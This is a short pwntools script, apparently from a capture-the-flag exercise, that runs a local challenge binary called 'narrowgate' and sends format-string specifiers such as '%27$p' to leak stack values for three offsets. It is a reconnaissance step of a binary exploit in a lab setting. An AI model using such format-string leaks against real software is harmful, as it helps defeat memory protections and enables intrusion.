from pwn import *
context.log_level='error'
for i in [27,29,43]:
    p=process(['/home/bocil/ctf/nfx/pwn/NarrowGate/peserta/ld-linux-x86-64.so.2','--library-path','/home/bocil/ctf/nfx/pwn/NarrowGate/peserta','/home/bocil/ctf/nfx/pwn/NarrowGate/peserta/narrowgate'],cwd='.')
    p.recvuntil(b'name> '); p.sendline(('%'+str(i)+'$p').encode()); print('%%%d$p = %s'%(i,p.recvline().decode().strip())); p.close()
